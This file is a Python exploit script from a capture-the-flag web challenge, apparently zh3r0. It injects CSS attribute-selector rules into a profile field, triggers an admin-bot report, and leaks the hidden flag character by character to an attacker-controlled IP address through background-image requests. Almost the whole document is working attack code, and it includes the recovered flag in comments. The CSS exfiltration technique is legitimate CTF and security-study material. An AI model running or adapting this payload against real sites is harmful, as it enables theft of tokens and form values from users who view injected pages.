#!/usr/bin/env python3

import os
import requests
import string
import urllib.parse
import time

url = "http://web.zh3r0.cf:4444"
self_url = "http://140.113.24.143:9002"


def register(s, payload):
    username = "l3o_" + os.urandom(4).hex()
    password = "test"
    flag = payload

    data = {"username": username, "password": password, "flag": flag}
    res = s.post(f"{url}/register", data=data)
    print(f"[+] Register {username} {password} {res.status_code} {res.url}")
    return res


# Idea: Add CSS rules matching all printable ASCII chars
# Update the prefix as we collect chars one by one

prefix = "z"
# prefix = "zh3r0{this_is_a_flag_"
# prefix = "zh3r0{this_is_a_flag_02"
# prefix = "zh3r0{this_is_a_flag_02b0482ec93d9f5688d"
# prefix = "zh3r0{this_is_a_flag_02b0482ec93d9f5688d5e0562fce"
# prefix = "zh3r0{this_is_a_flag_02b0482ec93d9f5688d5e0562fc2e2db"
# zh3r0{this_is_a_flag_02b0482ec93d9f5688d5e0562fc2e2db}

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"

s = requests.Session()
res = register(s, "temp")
profile = res.url.split("/")[-1]


while prefix[-1] != "}":
    rules = []
    for c in chars:
        rules.append(
            """input[value^="{prefix}{c}"] {{ background-image: url({self_url}/?c={ce}); }}""".format(
                prefix=prefix, self_url=self_url, c=c, ce=urllib.parse.quote(c)
            )
        )
    rules_str = "\n".join(rules)

    payload = """<style>
    .flag {{ display: block !important; }}
    {rules_str}
    </style>
    """.format(rules_str=rules_str)

    data = {'flag': payload}
    res = s.post(f"{url}/flag", data=data)
    print(f"[+] Change flag {res.status_code}")
    time.sleep(2)
    
    res = s.get(f"{url}/report/{profile}")
    print(f"[+] Report {res.status_code}")

    time.sleep(2)
    prefix = s.get(f"{self_url}/get_flag").text
    print(prefix)